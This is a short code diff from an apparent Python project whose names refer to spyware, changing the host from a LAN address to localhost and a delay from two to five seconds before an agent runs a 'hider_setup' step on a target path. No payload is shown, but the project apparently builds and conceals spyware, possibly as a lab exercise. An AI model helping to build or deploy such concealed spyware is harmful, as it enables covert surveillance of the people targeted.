@@ -7,8 +7,8 @@ from time import sleep
 from contParams import *
 from structParams import *
 
-HOST = "192.168.83.131"
-# HOST = "localhost"
+# HOST = "192.168.83.131"
+HOST = "localhost"
 PORT_MANEGER = 65432
 PORT_SPYWARE = 65410
 
@@ -31,7 +31,7 @@ def main():
             "sentSpyware.spy",
         )
     )
-    sleep(2)
+    sleep(5)
     spyAgent = Agent(HOST, PORT_SPYWARE)
     print(spyAgent.hider_setup(targetHiderPath))
 
